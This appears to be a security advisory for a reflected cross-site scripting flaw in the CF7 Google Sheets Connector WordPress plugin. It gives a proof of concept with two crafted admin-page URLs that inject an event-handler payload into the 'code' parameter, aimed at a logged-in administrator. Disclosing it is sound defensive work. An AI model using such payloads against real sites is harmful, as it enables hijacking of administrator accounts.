## WordPress Plugin Vulnerabilities

# CF7 Google Sheets Connector (Free < 5.0.2, Pro < 2.3.7) - Reflected XSS

### Description

The plugins do not escape a parameter before outputting it back in an attribute, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin

### Proof of Concept

Make a logged in admin open the URL below
cf7-google-sheets-connector - https://example.com/wp-admin/admin.php?page=wpcf7-google-sheet-config&code="style=animation-name:rotation onanimationstart=alert(/XSS/)//
cf7-google-sheets-connector-pro (when there is already a google token set) - https://example.com/wp-admin/admin.php?page=wpcf7-google-sheet-config&tab=integration&code="style=animation-name:rotation onanimationstart=alert(/XSS/)//
